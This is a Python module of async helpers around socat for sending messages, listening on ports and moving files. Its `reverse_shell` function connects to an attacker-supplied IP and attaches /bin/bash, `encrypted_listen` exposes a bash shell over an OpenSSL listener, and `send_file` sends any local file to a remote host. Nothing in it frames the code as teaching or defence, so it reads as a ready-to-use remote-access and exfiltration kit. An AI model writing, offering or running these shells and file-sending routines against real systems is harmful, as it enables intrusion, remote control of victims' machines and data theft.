import subprocess
import time
import asyncio
from urllib import response

async def sending(msg, ip, port): 
    try:
        response = subprocess.Popen(
            ['socat', '-', f'TCP4:{ip}:{port}'],
            text=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
        )
        response.stdin.write(msg + '\n')
        response.stdin.flush()

        output = await asyncio.wait_for(
            asyncio.to_thread(response.stdout.readline),
            timeout=5
        )
        response.terminate()

        return {"success": True, "data": output.strip()}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def listening(port):
    try:
        response = await asyncio.wait_for(
            asyncio.to_thread(subprocess.Popen,
                ['socat', f'TCP4-LISTEN:{port}', 'exec:/bin/cat'],
                text=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
            ),
            timeout=5
        )
        return response
    except Exception as e:
        return {"success": False, "error": str(e)}


async def send_file(file, ip, port):
    try:
        with open(file, 'r') as f:
            content = f.read()
        response = subprocess.Popen(
            ['socat', '-', f'TCP4:{ip}:{port}'],
            text=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
        )
        response.stdin.write(content + '\n')
        response.stdin.flush()

        output = await asyncio.wait_for(
            asyncio.to_thread(response.stdout.readline),
            timeout=5
        )
        response.terminate()

        return {"success": True, "data": output.strip()}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def reverse_shell(attacker_ip, attacker_port):
    try:
        response = await asyncio.wait_for(
            asyncio.to_thread(subprocess.Popen,
                ['socat', f'TCP4:{attacker_ip}:{attacker_port}', 'exec:/bin/bash,-echo=0'],
                text=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
            ),
            timeout=5
        )
        return response
    except Exception as e:
        return {"success": False, "error": str(e)}

async def encrypted_send(msg, ip, port):
    try:
        response = subprocess.Popen(
            ['socat', '-', f'OPENSSL:{ip}:{port},verify=0'],
            text=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
        )
        response.stdin.write(msg + '\n')
        response.stdin.flush()

        output = await asyncio.wait_for(
            asyncio.to_thread(response.stdout.readline),
            timeout=5
        )
        response.terminate()

        return {"success": True, "data": output.strip()}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def encrypted_listen(port):
    try:
        response = await asyncio.wait_for(
            asyncio.to_thread(subprocess.Popen,
                ['socat', f'OPENSSL-LISTEN:{port},cert=/path/to/cert.pem,reuseaddr,fork', 'exec:/bin/bash'],
                text=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
            ),
            timeout=5
        )
        return response
    except Exception as e:
        return {"success": False, "error": str(e)}

async def receive_file(port, save_path):
    try:
        response = await asyncio.wait_for(
            asyncio.to_thread(subprocess.Popen,
                ['socat', f'TCP4-LISTEN:{port}', f'file:{save_path}'],
                text=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
            ),
            timeout=5
        )
        return response
    except Exception as e:
        return {"success": False, "error": str(e)}